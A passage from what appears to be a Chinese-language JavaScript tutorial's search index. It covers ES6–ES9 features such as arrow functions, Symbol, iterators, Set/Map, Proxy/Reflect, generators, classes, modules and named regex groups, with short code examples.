test1:function(){ }, test2:function(){ } }; //简写 let name =\\\"moduleA\\\"; let obj = { name, test1(){ }, test2(){ } }; \"]},{\"header\":\"2. 属性名表达式\",\"slug\":\"_2-属性名表达式\",\"contents\":[\"let name =\\\"moduleA\\\"; let obj = { name, [name+\\\"test1\\\"](){ }, [name+\\\"test2\\\"](){ } }; console.log(obj); //{name: 'moduleA', moduleAtest1: ƒ, moduleAtest2: ƒ} \"]},{\"header\":\"3. Object.assign\",\"slug\":\"_3-object-assign\",\"contents\":[\"Object.assign(target, object1，object2)的第一个参数是目标对象，后面可以跟一个或多个源对象作为参数\",\"target：参数合并后存放的对象\",\"object1：参数1\",\"object2：参数2\",\"const obj = {}; const obj1 = { name: \\\"kerwin\\\" }; const obj2 = { name:\\\"tiechui\\\" }; const obj3 = { age:100 }; console.log(Object.assign(obj, obj1, obj2, obj3)); // {name: 'tiechui', age: 100} \"]},{\"header\":\"4. Object.is\",\"slug\":\"_4-object-is\",\"contents\":[\"方法判断两个值是否是相同的值\",\"// 之前存在的问题： console.log(NaN===NaN); //false console.log(+0===-0); //true //解决： console.log(Object.is(NaN,NaN)); //true console.log(Object.is(+0,-0)); //false \"]},{\"header\":\"10. 函数扩展\",\"slug\":\"_10-函数扩展\",\"contents\":[]},{\"header\":\"1. 箭头函数\",\"slug\":\"_1-箭头函数\",\"contents\":[\"箭头函数是 ES6 里面一个简写函数的语法方式\",\"重点： 箭头函数只能简写函数表达式，不能简写声明式函数\",\"function fn() {} // 不能简写 const fun = function () {} // 可以简写 const obj = { fn: function () {} // 可以简写 } \",\"语法： (函数的形参) => { 函数体内要执行的代码 }\",\"const fn = function (a, b) { console.log(a); console.log(b); } // 可以使用箭头函数写成 const fun = (a, b) => { console.log(a); console.log(b); } \",\"const obj = { fn: function (a, b) { console.log(a); console.log(b); } } // 可以使用箭头函数写成 const obj2 = { fn: (a, b) => { console.log(a); console.log(b); } } \"]},{\"header\":\"2. 箭头函数的特殊性\",\"slug\":\"_2-箭头函数的特殊性\",\"contents\":[\"箭头函数内部没有 this，箭头函数的 this 是上下文的 this\",\"const obj = { fn: function () { // 在箭头函数定义的位置往上数，这一行是可以打印出 this 的 // 因为这里的 this 是 window // 所以箭头函数内部的 this 就是 window console.log(this); }, // 这个位置是箭头函数的上一行，但是不能打印出 this fun: () => { // 箭头函数内部的 this 是书写箭头函数的上一行一个可以打印出 this 的位置的 this console.log(this); } } obj.fn(); obj.fun(); \",\"按照我们之前的 this 指向来判断，两个都应该指向 obj，但是 fun 因为是箭头函数，所以 this 不指向 obj，而是指向 fun 的外层，就是 window\",\"箭头函数内部没有 arguments 这个参数集合\",\"const obj = { fn: function () { console.log(arguments); }, fun: () => { console.log(arguments); } } obj.fn(1, 2, 3); // 会打印一个伪数组 [1, 2, 3] obj.fun(1, 2, 3); // 会直接报错 \",\"函数的形参只有一个的时候可以不写 () 其余情况必须写\",\"const obj = { fn: () => { console.log('没有参数，必须写小括号'); }, fn2: a => { console.log('一个形参，可以不写小括号'); }, fn3: (a, b) => { console.log('两个或两个以上参数，必须写小括号'); } } \",\"函数体只有一行代码的时候，可以不写 {} ，并且会自动 return\",\"const obj = { fn: a => { return a + 10; }, fun: a => a + 10; } console.log(fn(10)); // 20 console.log(fun(10)); // 20 \",\"由于箭头函数没有this，所以无法使用call、apply、bind来改变箭头函数的this指向\"]},{\"header\":\"3. 函数参数默认值\",\"slug\":\"_3-函数参数默认值\",\"contents\":[\"我们在定义函数的时候，有的时候需要一个默认值出现，就是当我不传递参数的时候，使用默认值，传递参数了就使用传递的参数\",\"function fn(a) { a = a || 10; console.log(a); } fn(); // 不传递参数的时候，函数内部的 a 就是 10 fn(20); // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"在 ES6 中我们可以直接把默认值写在函数的形参位置\",\"function fn(a = 10) { console.log(a); } fn(); // 不传递参数的时候，函数内部的 a 就是 10 fn(20); // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"这个默认值的方式箭头函数也可以使用\",\"const fn = (a = 10) => { console.log(a); } fn(); // 不传递参数的时候，函数内部的 a 就是 10 fn(20); // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"注意： 箭头函数如果你需要使用默认值的话，那么一个参数的时候也需要写 （）\"]},{\"header\":\"11. Symbol\",\"slug\":\"_11-symbol\",\"contents\":[\"ES6 引入了一种新的原始数据类型Symbol，表示独一无二的值。它属于 JavaScript 语言的原生数据类型之一，其他数据类型是：undefined、null、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）\",\"注意：symbol类型不能直接进行运算\",\"使用Symbol作为对象属性名\",\"let name = Symbol(); // 生成了一个symbol类型数据 let age = Symbol(); var obj = { [name]:\\\"kerwin\\\", [age]:100 }; console.log(obj); // {Symbol(): 'kerwin', Symbol(): 100} console.log(obj.name); // undefined console.log(obj[name]); // kerwin \",\"Symbol()函数可以接受一个字符串作为参数，表示对 Symbol 实例的描述。这主要是为了在控制台显示，比较容易区分\",\"let name = Symbol(\\\"name\\\") let age = Symbol(\\\"age\\\") var obj ={ [name]:\\\"kerwin\\\", [age]:100 } console.log(obj); // {Symbol(name): 'kerwin', Symbol(age): 100} \",\"遍历问题\",\"// 使用for in 无法遍历symbol定义的 // 使用Object.getOwnPropertySymbols 可以遍历symbol定义的 // 使用Reflect.ownKeys可以 let keys = { name:Symbol(\\\"name\\\"), age:Symbol(\\\"age\\\") } var obj ={ [keys.name]:\\\"kerwin\\\", [keys.age]:100, a:1, b:2, c:3 } Reflect.ownKeys(obj).forEach(item=>{ console.log(item,obj[item]); }) // a 1 // b 2 // c 3 // Symbol(name) 'kerwin' // Symbol(age) 100 \",\"Symbol.for()可以重新使用同一个 Symbol 值\",\"var obj ={ [Symbol.for(\\\"name\\\")]:\\\"kerwin\\\", [Symbol.for(\\\"age\\\")]:100 } console.log(obj[Symbol.for(\\\"name\\\")]); \",\"Symbol可以作为常量\",\"const VIDEO = Symbol(); const AUDIO = Symbol(); const IMAGE = Symbol(); function play(type){ switch(type){ case VIDEO: console.log('视频播放'); break; case AUDIO: console.log('音频播放'); break; case IMAGE: console.log('图片播放'); break; } } play(VIDEO); // 视频播放 \"]},{\"header\":\"12. Iterator迭代器\",\"slug\":\"_12-iterator迭代器\",\"contents\":[\"Iterator 的作用有三个：\",\"为各种数据结构，提供一个统一的、简便的访问接口\",\"使得数据结构的成员能够按某种次序排列\",\"ES6 创造了一种新的遍历命令for...of循环，Iterator 接口主要供for...of循环\",\"let arr = [\\\"kerwin\\\", \\\"tiechui\\\", \\\"gangdaner\\\"]; for(let i of arr){ console.log(i); // kerwin tiechui gangdaner } \",\"Iterator 的遍历过程是这样的：\",\"创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象\",\"第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员\",\"第二次调用指针对象的next方法，指针就指向数据结构的第二个成员\",\"不断调用指针对象的next方法，直到它指向数据结构的结束位置\",\"let i = arr[Symbol.iterator](); console.log(i.next()); // {value: 'kerwin', done: false} console.log(i.next()); // {value: 'tiechui', done: false} console.log(i.next()); // {value: 'gangdaner', done: false} console.log(i.next()); // {value: undefined, done: true} \",\"ES6 规定，默认的 Iterator 接口部署在数据结构的Symbol.iterator属性，或者说，一个数据结构只要具有Symbol.iterator属性，就可以认为是“可遍历的”（iterable）。Symbol.iterator属性本身是一个函数，就是当前数据结构默认的遍历器生成函数。执行这个函数，就会返回一个遍历器\",\"原生默认具备 Iterator 接口的数据结构如下：\",\"Array\",\"Set\",\"Map\",\"String\",\"arguments 对象\",\"NodeList 对象\",\"如何对对象进行for of遍历？\",\"let obj = { 0: \\\"kerwin\\\", 1: \\\"tiechui\\\", 2: \\\"gangdaner\\\", length: 3, [Symbol.iterator]: Array.prototype[Symbol.iterator] } for (let i of obj) { console.log(i); } // kerwin // tiechui // gangdaner let obj2 = { data: ['kerwin', 'tiechui', \\\"gangdaner\\\"], // 迭代器 [Symbol.iterator]() { // let _this = this let index = 0 return { next: () => { if (index < this.data.length) { return { value: this.data[index++], done: false } } else { return { value: undefined, done: true } } } } } } for (let i of obj2) { console.log(i); } // kerwin // tiechui // gangdaner \",\"...展开运算符会调用内置迭代器\",\"let obj2 = { data: ['kerwin', 'tiechui', \\\"gangdaner\\\"], // 迭代器 [Symbol.iterator]() { // let _this = this let index = 0 return { next: () => { if (index < this.data.length) { return { value: this.data[index++], done: false } } else { return { value: undefined, done: true } } } } } } console.log([...obj2]); // ['kerwin', 'tiechui', 'gangdaner'] \"]},{\"header\":\"13. Set结构\",\"slug\":\"_13-set结构\",\"contents\":[\"它类似于数组，但成员的值都是唯一的，没有重复的值\"]},{\"header\":\"1. 初识Set\",\"slug\":\"_1-初识set\",\"contents\":[\"// 可以实现数组去重 let s1 = new Set([1, 2, 3, 2, 3]); console.log(s1); // {1,2,3} console.log([...s1]); // [1,2,3] let s2 = new Set(); s2.add(1); s2.add(2); s2.add(3); console.log(s2); // {1, 2, 3} \"]},{\"header\":\"2. 实例的属性和方法\",\"slug\":\"_2-实例的属性和方法\",\"contents\":[\"size：返回Set实例的成员总数\",\"Set.prototype.add(value)：添加某个value\",\"Set.prototype.delete(value)：删除某个value，返回一个布尔值，表示删除是否成功\",\"Set.prototype.has(value)：返回一个布尔值，表示该值是否为Set的成员\",\"Set.prototype.clear()：清除所有成员，没有返回值\",\"let s1 = new Set([1, 2, 3, 2, 3]); console.log(s1.size); // 3 s1.add(4).add(5).add(6); console.log(s1); // {1, 2, 3, 4, 5, 6} console.log(s1.has(8)); // false console.log(s1.has(5)); //true s1.delete(5); console.log(s1); // {1, 2, 3, 4, 6} s1.clear(); console.log(s1); // {size: 0} \"]},{\"header\":\"3. 遍历\",\"slug\":\"_3-遍历\",\"contents\":[\"Set.prototype.keys()：返回键名的遍历器\",\"Set.prototype.values()：返回键值的遍历器\",\"Set.prototype.entries()：返回键值对的遍历器\",\"Set.prototype.forEach()：遍历每个成员\",\"let s1 = new Set([1, 2, 3, 2, 3]); for(let i of s1){ console.log(i); } // 1 // 2 // 3 for(let i of s1.keys()){ console.log(i); } // 1 // 2 // 3 for(let i of s1.values()){ console.log(i); } // 1 // 2 // 3 for(let i of s1.entries()){ console.log(i); } // [1,1] // [2,2] // [3,3] for(let [index,item] of s1.entries()){ console.log(index,item); } // 1 1 // 2 2 // 3 3 s1.forEach((item,index)=>{ console.log(item,index); }) // 1 1 // 2 2 // 3 3 \"]},{\"header\":\"4. 复杂数据结构去重\",\"slug\":\"_4-复杂数据结构去重\",\"contents\":[\"function uni(arr) { let res = new Set(); return arr.filter(item => { let id = JSON.stringify(item); if (res.has(id)) { return false; } else { res.add(id); return true; } }) } var list = [1, 2, 3, \\\"data\\\", {name: \\\"kerwin\\\"}, {name: \\\"kerwin\\\"},[1, 2],[3, 4],[3, 4]]; console.log(uni(list)); //[1,2,3,\\\"data\\\",{name:\\\"kerwin\\\"},[1,2],[3,4]] \"]},{\"header\":\"14. Map结构\",\"slug\":\"_14-map结构\",\"contents\":[\"类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键\"]},{\"header\":\"1. 初识Map\",\"slug\":\"_1-初识map\",\"contents\":[\"let m1 = new Map(); m1.set(\\\"name\\\",\\\"kerwin\\\"); m1.set({a:1},\\\"大连\\\"); console.log(m1); //{\\\"name\\\" => \\\"kerwin\\\",{ {a:1}=> \\\"大连\\\"} let m2= new Map([ [\\\"name\\\",\\\"kerwin\\\"], [{a:1},\\\"大连\\\"] ]); console.log(m2); //{\\\"name\\\" => \\\"kerwin\\\",{ {a:1}=> \\\"大连\\\"} \"]},{\"header\":\"2. 实例的属性和方法\",\"slug\":\"_2-实例的属性和方法-1\",\"contents\":[\"size：返回 Map 结构的成员总数。\",\"Map.prototype.set(key,value)：添加key对应得value，返回 Map 结构本身。\",\"Map.prototype.get(key)：获取key对应的value\",\"Map.prototype.delete(key)：删除某个键（键名+键值）\",\"Map.prototype.has(key)：某个键是否在当前 Map 对象之中\",\"Map.prototype.clear()：清除所有成员，没有返回值。\",\"let o = {a:1}; let m1= new Map([ [\\\"name\\\",\\\"kerwin\\\"], [o,\\\"大连\\\"] ]); m1.set(\\\"age\\\",18); console.log(m1); // {'name' => 'kerwin', {{a:1}} => '大连', 'age' => 18} console.log(m1.size); //3 console.log(m1.get(\\\"name\\\")); // kerwin console.log(m1.get(o)); // 大连 console.log(m1.has(\\\"age\\\")); // true m1.delete(\\\"age\\\"); console.log(m1.has(\\\"age\\\")); //false m1.clear(); console.log(m1); // {size:0} \"]},{\"header\":\"3. 遍历\",\"slug\":\"_3-遍历-1\",\"contents\":[\"Map.prototype.keys()：返回键名的遍历器\",\"Map.prototype.values()：返回键值的遍历器\",\"Map.prototype.entries()：返回所有成员的遍历器\",\"Map.prototype.forEach()：遍历 Map 的所有成员\",\"let o = {a:1}; let m1= new Map([ [\\\"name\\\",\\\"kerwin\\\"], [o,\\\"大连\\\"] ]); m1.set(\\\"age\\\",18); console.log(m1) // {'name' => 'kerwin', {{a:1}} => '大连', 'age' => 18} for(let i of m1.keys()){ console.log(i); } // name // {a:1} // age for(let i of m1.values()){ console.log(i); } // kerwin // 大连 // 18 for(let [index,item] of m1.entries()){ console.log(index,item); } // name kerwin // {a: 1} '大连' // age 18 m1.forEach((item,index)=>{ console.log(item,index); }) // kerwin name // 大连 {a: 1} // 18 'age' \"]},{\"header\":\"15. Proxy代理\",\"slug\":\"_15-proxy代理\",\"contents\":[\"Proxy如其名， 它的作用是在对象和和对象的属性值之间设置一个代理，获取该对象的值或者设置该对象的值， 以及实例化等等多种操作， 都会被拦截住， 经过这一层我们可以统一处理，我们可以认为它就是“代理器”\",\"在没有proxy之前，我们使用Object.defineProperty()\",\"<div id=\\\"box\\\"></div> \",\"let obj = {} Object.defineProperty(obj,\\\"data\\\",{ get(){ console.log(\\\"get\\\") return box.innerHTML }, set(value){ console.log(\\\"set\\\",value) box.innerHTML = value } }) \",\"使用obj.data即可设置\",\"ES6~ES1301.gif\",\"使用proxy实现：\",\"<div id=\\\"box\\\"></div> \",\"let obj = {} let proxy = new Proxy(obj,{ get(target,key){ console.log(\\\"get\\\",target[key]) return target[key] }, set(target,key,value){ console.log(\\\"set\\\",target,key,value) if(key===\\\"data\\\"){ box.innerHTML=value } target[key]=value } }) \",\"ES6~ES1302.gif\"]},{\"header\":\"1. get方法\",\"slug\":\"_1-get方法\",\"contents\":[\"let target = {}; let proxy = new Proxy(target,{ get(target,prop){ return target[prop]; } }) \"]},{\"header\":\"2. set方法\",\"slug\":\"_2-set方法\",\"contents\":[\"let target = {}; let proxy = new Proxy(target,{ get(target,prop){ return target[prop]; }, set(target,prop,value){ if(prop===\\\"data\\\"){ box.innerHTML = value; } target[prop] = value; } }) \"]},{\"header\":\"3. has方法\",\"slug\":\"_3-has方法\",\"contents\":[\"let target = { _prop: \\\"内部数据\\\" }; let proxy = new Proxy(target, { get(target, prop) { return target[prop]; }, set(target, prop, value) { if (prop === \\\"data\\\") { box.innerHTML = value; } target[prop] = value; }, has(target, key) { if (key[0] === '_') { return false; } return key in target; } }) \"]},{\"header\":\"4. this问题\",\"slug\":\"_4-this问题\",\"contents\":[\"let target = new Set() const proxy = new Proxy(target, { get(target, key) { const value = target[key]; // 遇到 Function 都手动绑定一下 this if (value instanceof Function) { console.log(`访问${value}方法了`); return value.bind(target); //不能 是 call apply } return value; } }) proxy.add(1); //访问function add() { [native code] }方法了 \",\"Proxy本质上属于元编程非破坏性数据劫持，在原对象的基础上进行了功能的衍生而又不影响原对象，符合松耦合高内聚的设计理念\"]},{\"header\":\"16. Reflect对象\",\"slug\":\"_16-reflect对象\",\"contents\":[\"Reflect 可以用于获取目标对象的行为，它与 Object 类似，但是更易读，为操作对象提供了一种更优雅的方式。它的方法与 Proxy 是对应的\"]},{\"header\":\"1. 代替Object的某些方法\",\"slug\":\"_1-代替object的某些方法\",\"contents\":[\"const obj = { }; Reflect.defineProperty(obj, 'name', { value: 'kerwin', writable: false, configurable:false }); \"]},{\"header\":\"2. 修改某些Object方法返回结果\",\"slug\":\"_2-修改某些object方法返回结果\",\"contents\":[\"// 老写法 try { Object.defineProperty(target, property, attributes); // success } catch (e) { // fail } // 新写法 if (Reflect.defineProperty(target, property, attributes)) { // success } else { // fail } \"]},{\"header\":\"3. 命令式变为函数行为\",\"slug\":\"_3-命令式变为函数行为\",\"contents\":[\"const obj = { name:\\\"kerwin\\\" }; //老写法 console.log(\\\"name\\\" in obj); //true //新写法 console.log(Reflect.has(obj, 'name')); //true //老写法 delete obj.name; //新写法 Reflect.deleteProperty(obj, \\\"name\\\"); \"]},{\"header\":\"4. 配合Proxy\",\"slug\":\"_4-配合proxy\",\"contents\":[\"let target = new Set(); const proxy = new Proxy(target, { get(target, key) { const value = Reflect.get(target,key); // 遇到 Function 都手动绑定一下 this if (value instanceof Function) { console.log(`访问${value}方法了`); return value.bind(target); //不能 是 call apply } return value; }, set() { return Reflect.set(...arguments); } }) proxy.add(1); \",\"let arr = [1, 2, 3]; let proxy = new Proxy(arr, { get(target, key) { console.log('get', key); return Reflect.get(...arguments); }, set(target, key, value) { console.log('set', key, value); return Reflect.set(...arguments); } }) proxy.push(4); // 能够打印出很多内容 // get push (寻找 proxy.push 方法) // get length (获取当前的 length) // set 3 4 (设置 proxy[3] = 4) // set length 4 (设置 proxy.length = 4) \"]},{\"header\":\"17. Promise\",\"slug\":\"_17-promise\",\"contents\":[\"Promise 是异步编程的一种解决方案，比传统的解决方案回调函数, 更合理和更强大。ES6 将其写进了语言标准，统一了用法，原生提供了Promise对象\",\"详见Promise篇\"]},{\"header\":\"18. Generator函数\",\"slug\":\"_18-generator函数\",\"contents\":[\"Generator 函数是 ES6 提供的一种异步编程解决方案\",\"Generator 函数是一个状态机，封装了多个内部状态\",\"执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历 Generator 函数内部的每一个状态\"]},{\"header\":\"1. 基本语法\",\"slug\":\"_1-基本语法\",\"contents\":[\"function *gen(){ console.log(1); yield; // 产出 console.log(2); yield; // 产出 console.log(3); } let g = gen(); g.next(); g.next(); g.next(); // 1 // 2 // 3 \",\"yield(产出)表达式是暂停执行的标记，而next方法可以恢复执行\",\"function *gen(){ yield 1 yield 2 } let g = gen(); let res1 = g.next(); console.log(res1); let res2 = g.next(); console.log(res2); let res3 = g.next(); console.log(res3); // {value:'a',done:false} // {value:'b',done:false} // {value:undefined,done:true} \",\"function *gen(){ let res1 = yield; console.log(\\\"gen内部\\\",res1); let res2 = yield; console.log(\\\"gen内部\\\",res2); } let g = gen(); g.next(\\\"data-1\\\"); g.next(\\\"data-2\\\"); g.next(\\\"data-3\\\"); // gen内部 data-2 // gen内部 data-3 \"]},{\"header\":\"2. 异步流程\",\"slug\":\"_2-异步流程\",\"contents\":[\"手动版本\",\"function *gen(){ let res1 = yield ajax(\\\"1.json\\\"); console.log(res1); let res2 = yield ajax(\\\"2.json\\\",res1); console.log(res2); } let g = gen(); g.next().value.then(data=>{ g.next(data).value.then(data=>{ g.next(data); }) }) \",\"自动版本\",\"function* gen() { let res1 = yield ajax(\\\"1.json\\\"); console.log(res1); let res2 = yield ajax(\\\"2.json\\\"); console.log(res2); } function AutoRun(gen) { let g = gen(); function next(data) { let res = g.next(data); if (res.done) return; res.value.then(function (data) { next(data); }) } next(); } AutoRun(gen); \"]},{\"header\":\"19. Class语法\",\"slug\":\"_19-class语法\",\"contents\":[]},{\"header\":\"1. 类的写法\",\"slug\":\"_1-类的写法\",\"contents\":[\"class Person { constructor(name,age){ this.name = name; this.age = age; } say(){ console.log(this.name,this.age); } } let obj = new Person(\\\"kerwin\\\",100); console.log(obj); //{name:\\\"kerwin\\\",age:100} \"]},{\"header\":\"2. getter与setter\",\"slug\":\"_2-getter与setter\",\"contents\":[\"<ul id=\\\"list\\\"></ul> \",\"class List{ constructor(ele){ this.element = ele; } get html(){ return this.element.innerHTML; } set html(arr){ this.element.innerHTML = arr.map(item=>`<li>${item}</li>`).join(\\\"\\\"); } } let obj = new List(document.querySelector(\\\"#list\\\")); obj.html = [\\\"aaa\\\",\\\"bbb\\\",\\\"cccc\\\"]; \",\"结果：\",\"aaa bbb ccc \"]},{\"header\":\"3. 静态属性和静态方法\",\"slug\":\"_3-静态属性和静态方法\",\"contents\":[\"class Person { static name = \\\"Person这个类\\\"; constructor(name,age){ this.name = name; this.age = age; } say(){ console.log(this.name,this.age); } static eat(){ console.log(\\\"eat\\\"); } } let obj = new Person(\\\"kerwin\\\",100); console.log(Person.name); Person.eat(); // Person这个类 // eat \"]},{\"header\":\"4. 继承\",\"slug\":\"_4-继承\",\"contents\":[\"ES6 规定，子类必须在constructor()方法中调用super()，否则就会报错。这是因为子类自己的this对象，必须先通过父类的构造函数完成塑造，得到与父类同样的实例属性和方法，然后再对其进行加工，添加子类自己的实例属性和方法。如果不调用super()方法，子类就得不到自己的this对象\",\"class Person { static name = \\\"Person这个类\\\"; constructor(name,age){ this.name = name; this.age = age; } say(){ console.log(this.name,this.age); } static eat(){ console.log(\\\"eat\\\"); } } class Student extends Person{ constructor(name,age,score){ super(name,age); this.score = score; } say(){ super.say(); console.log(this.score); } static eat(){ super.eat(); console.log(\\\"student eat\\\"); } } let obj = new Student(\\\"kerwin\\\",100,200); console.log(obj); obj.say(); Student.eat(); // Student // kerwin 100 // 200 // eat // student eat \"]},{\"header\":\"20. 模块化\",\"slug\":\"_20-模块化\",\"contents\":[\"JavaScript 现在有两种模块。一种是 ES6 模块，简称 ESM；另一种是 CommonJS 模块，简称 CJS\",\"CommonJS 模块是 Node.js 专用的，与 ES6 模块不兼容。语法上面，两者最明显的差异是，CommonJS 模块使用require()和module.exports，ES6 模块使用import和export\",\"ES6 模块不是对象，而是通过export命令显式指定输出的代码，再通过import命令输入\",\"先看一个问题：\",\"1.js\",\"const odiv = document.querySelector(\\\"div\\\"); console.log(odiv); \",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <script src=\\\"1.js\\\"></script> </head> <body> <div></div> </body> </html> \",\"输出结果为null\",\"在没有模块化以前，可以使用如下方式解决：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <script src=\\\"1.js\\\" defer></script> <!-- <script src=\\\"1.js\\\" async></script> --> </head> <body> <div></div> </body> </html> \",\"模块化方法：\",\"优点：\",\"异步加载\",\"私密不漏\",\"重名不怕\",\"依赖不乱\",\"1.js\",\"const odiv = document.querySelector(\\\"div\\\"); console.log(odiv); \",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <script src=\\\"1.js\\\" type=\\\"module\\\"></script> </head> <body> <div></div> </body> </html> \",\"可以解决异步加载问题\",\"导入和导出模块：\",\"写法1：\",\"//导出 export default A1; //导入 import a1 from \\\"./1.js\\\"; \",\"例：\",\"1.js\",\"function A1() { a1(); console.log('A1'); } function A2() { console.log('A2'); } function a1() { console.log('a1'); } //导出暴露的方法 export default A1; \",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> </head> <body> <script type=\\\"module\\\"> //导入1.js中的方法，前面的A1名字可以随便起 import A1 from './1.js' console.log(A1) </script> </body> </html> \",\"写法2：\",\"export {A1,A2}; import {A1,A2} from \\\"./1.js\\\"; import {A1 as a1,A2 as a2} from \\\"./1.js\\\"; //可以改名 import * as obj from \\\"./1.js\\\"; //全部导入并且名为obj \",\"例：\",\"1.js\",\"function A1() { a1(); console.log('A1'); } function A2() { console.log('A2'); } function a1() { console.log('a1'); } //导出暴露的方法 export { A1, A2 }; // export default { A1, A2 } \",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> </head> <body> <script type=\\\"module\\\"> //导入1.js中的方法 import { A1, A2 } from './1.js' // import obj from './1.js' console.log(A1) console.log(A2) // console.log(obj.A1) // console.log(obj.A2) </script> </body> </html> \",\"//还可以直接暴露函数 export function A1(){ console.log(\\\"A1\\\"); } export function A2(){ console.log(\\\"A2\\\"); } import {A1,A2} from \\\"./1.js\\\"; import {A1 as a1,A2 as a2} from \\\"./1.js\\\"; import * as obj from \\\"./1.js\\\"; \",\"混合写法：\",\"export {A1; export default A2; import A2,{A1} from \\\"./1.js\\\"; \"]},{\"header\":\"2. ES7\",\"slug\":\"_2-es7\",\"contents\":[]},{\"header\":\"2.1 求幂运算符\",\"slug\":\"_2-1-求幂运算符\",\"contents\":[\"Math.pow(3, 2) === 3 ** 2 // 9 \"]},{\"header\":\"2.2 数组的includes方法\",\"slug\":\"_2-2-数组的includes方法\",\"contents\":[\"[1, 2, NaN].includes(NaN) // true [1, 2, NaN].indexOf(NaN) // -1 \",\"如果仅仅查找数据是否在数组中，建议使用includes，如果是查找数据的索引位置，建议使用indexOf更好一些\"]},{\"header\":\"3. ES8\",\"slug\":\"_3-es8\",\"contents\":[]},{\"header\":\"3.1 async和await\",\"slug\":\"_3-1-async和await\",\"contents\":[\"详见Promise篇\"]},{\"header\":\"3.2 对象方法扩展\",\"slug\":\"_3-2-对象方法扩展\",\"contents\":[\"let obj = { name:\\\"kerwin\\\", age:100 } console.log(Object.values(obj)) // ['kerwin', 100] \",\"let obj = { name:\\\"kerwin\\\", age:100 } console.log(Object.entries(obj)) // [['name','kerwin'],['age',100]] \",\"let obj = { name:\\\"kerwin\\\", age:100 } console.log(Object.getOwnPropertyDescriptors(obj)) // {name:{...},age{...}} \",\"克隆对象\",\"let obj1 = { name:\\\"Kerwin\\\", age:100, location:{ provice:\\\"辽宁\\\", city:\\\"大连\\\" }, //只设置city，防止破坏province get city(){ return this.location.city }, set city(value){ this.location.city = value }, set nameset(value){ this.name = value.substring(0,1).toUpperCase()+value.substring(1) }, get nameset(){ return this.name } } console.log(Object.getOwnPropertyDescriptors(obj1)) var obj2= {} //Object.assign(obj2,obj1)//无法克隆 get set方法 Object.defineProperties(obj2,Object.getOwnPropertyDescriptors(obj1)) \"]},{\"header\":\"3.3 字符串填充\",\"slug\":\"_3-3-字符串填充\",\"contents\":[\"padStart()、padEnd()方法可以使得字符串达到固定长度，有两个参数，字符串目标长度和填充内容\",\"let str= \\\"kerwin\\\" console.log(str.padStart(10,\\\"x\\\"));//xxxxkerwin console.log(str.padEnd(10,\\\"x\\\"));//kerwinxxxx console.log(str.padStart(5,\\\"x\\\"))//kerwin console.log(str.padEnd(5,\\\"x\\\"))//kerwin \"]},{\"header\":\"3.4 函数参数的末尾加逗号\",\"slug\":\"_3-4-函数参数的末尾加逗号\",\"contents\":[\"function test( a, b, c, ){ console.log(a,b) } test( 1, 2, 3, ) \",\"『末尾逗号』在添加新的参数、属性、元素时是有用的，你可以直接新加一行而不必给上一行再补充一个逗号，这样使版本控制工具的修改记录也更加整洁\"]},{\"header\":\"4. ES9\",\"slug\":\"_4-es9\",\"contents\":[]},{\"header\":\"4.1 对象的剩余参数与扩展运算符\",\"slug\":\"_4-1-对象的剩余参数与扩展运算符\",\"contents\":[]},{\"header\":\"4.1.1 对象的剩余参数\",\"slug\":\"_4-1-1-对象的剩余参数\",\"contents\":[\"let obj = { name:\\\"kerwin\\\", age:100, location:\\\"dalian\\\" } let {name,...other} = obj console.log(name) //kerwin console.log(other) //{age: 100, location: 'dalian'} \"]},{\"header\":\"4.1.2 对象的扩展运算符\",\"slug\":\"_4-1-2-对象的扩展运算符\",\"contents\":[\"let obj1 = { name:\\\"kerwin\\\" } let obj2 = { age:100 } console.log({...obj1,...obj2}) // {name: 'kerwin', age: 100} \"]},{\"header\":\"4.2 正则表达式命名捕获组\",\"slug\":\"_4-2-正则表达式命名捕获组\",\"contents\":[\"JS正则表达式可以返回一个匹配的对象, 一个包含匹配字符串的类数组, 比如: 以 YYYY-MM-DD的格式解析日期，这样的代码可读性很差, 并且在改变正则表达式的结构的时候很有可能就会改变匹配对象的索引\",\"ES9允许使用命名捕获?<name>, 在打开捕获括号后立即命名\",\"let str = \\\"今天是2022-10-10\\\" let reg = /([0-9]{4})-([0-9]{2})-([0-9]{2})/g let res1 = reg.exec(str) console.log(res1) // ['2022-10-10', '2022', '10', '10', index: 3, input: '今天是2022-10-10', groups: undefined] \",\"let str = \\\"今天是2022-10-10\\\" let reg = /(?<year>[0-9]{4})-(?<month>[0-9]{2})-(?<day>[0-9]{2})/g let res1 = reg.exec(str) console.log(res1) // ['2022-10-10', '2022', '10', '10', index: 3, input: '今天是2022-10-10', groups: {year: '2022', month: '10', day: '10'}] \"]},{\"header\":\"4.3 